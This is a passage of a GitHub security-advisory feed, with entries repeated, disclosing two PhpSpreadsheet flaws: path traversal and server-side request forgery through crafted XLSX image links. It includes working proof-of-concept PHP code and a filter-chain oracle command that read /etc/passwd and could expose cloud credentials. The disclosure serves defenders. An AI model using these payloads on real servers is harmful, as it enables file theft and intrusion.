<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45291">https://nvd.nist.gov/vuln/detail/CVE-2024-45291</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T22:29:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45291">https://nvd.nist.gov/vuln/detail/CVE-2024-45291</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T22:29:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45291">https://nvd.nist.gov/vuln/detail/CVE-2024-45291</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T22:29:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45290">https://nvd.nist.gov/vuln/detail/CVE-2024-45290</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T22:29:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45290">https://nvd.nist.gov/vuln/detail/CVE-2024-45290</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T22:29:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
